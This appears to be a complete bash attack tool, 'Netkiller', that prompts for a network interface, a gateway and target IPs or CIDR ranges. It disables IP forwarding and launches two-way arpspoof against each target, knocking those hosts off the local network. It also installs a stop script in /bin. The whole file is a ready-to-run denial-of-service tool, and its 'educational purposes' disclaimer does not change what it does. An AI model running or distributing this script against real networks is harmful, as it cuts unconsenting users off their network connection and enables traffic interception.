#!/bin/bash

# Netkiller made by x!v3r
# For Educational Purposes only!
echo ""

# Prompt for network interface
echo "Enter the network interface (e.g., wlan0)"
read -p "> " INTERFACE
echo ""

# Prompt for gateway IP
echo "Enter the gateway IP (e.g., 10.0.0.1)"
read -p "> " GATEWAY
echo ""

# Prompt for target IPs (space-separated IPs or CIDR ranges)
echo "Enter Multiple Target (e.g., 10.0.0.10 10.0.0.20) or CIDR range (10.0.0.1/20)"
read -p "> " TARGET_INPUT
echo ""

# Get this device's IP address
DEVICE_IP="$(ip addr show $INTERFACE | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)"

echo "[=== Network Attack Configurations ===]"
echo ""
echo "[*] Interface  => $INTERFACE"
echo "[*] Gateway IP => $GATEWAY"
echo "[*] Device IP  => $DEVICE_IP"
echo "[*] Targets IP => $TARGET_INPUT"

# Function to expand CIDR to individual IPs using ipcalc
expand_cidr() {
  local cidr=$1
  ipcalc -n $cidr | grep -oP '\d+\.\d+\.\d+\.\d+' | while read ip; do
    # Exclude the device's own IP
    if [ "$ip" != "$DEVICE_IP" ]; then
      echo "$ip"
    fi
  done
}

# Initialize array for target IPs
TARGET_IPS=()

# Process input: split into individual IPs or CIDR ranges
IFS=' ' read -ra INPUT_ARRAY <<< "$TARGET_INPUT"
for item in "${INPUT_ARRAY[@]}"; do
  # Check if the item is a CIDR range (contains '/')
  if [[ $item == */* ]]; then
    # Expand CIDR to individual IPs
    while read -r ip; do
      TARGET_IPS+=("$ip")
    done < <(expand_cidr "$item")
  else
    # Add single IP if it's not the device's IP
    if [ "$item" != "$DEVICE_IP" ]; then
      TARGET_IPS+=("$item")
    fi
  fi
done

# Check if we have valid target IPs
if [ ${#TARGET_IPS[@]} -eq 0 ]; then
  echo "No valid target IPs provided (device IP excluded)."
  exit 1
fi

# Disable IP forwarding
echo 0 > /proc/sys/net/ipv4/ip_forward

# Run arpspoof for each target IP
for TARGET_IP in "${TARGET_IPS[@]}"; do
echo ""
echo "[*] Netkiller kill the target IP => $TARGET_IP"

  sudo arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
  sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
done

echo ""
echo "To stop, Run: sudo netkiller-stop "
echo ""

# Clear the rules
cat > /bin/netkiller-stop << EOF
#!/bin/bash

pkill -f arpspoof
echo 1 > /proc/sys/net/ipv4/ip_forward

echo ""
echo "Netkiller is Stopped. Restoring the connection..."
echo ""

EOF
chmod 755 /bin/netkiller-stop
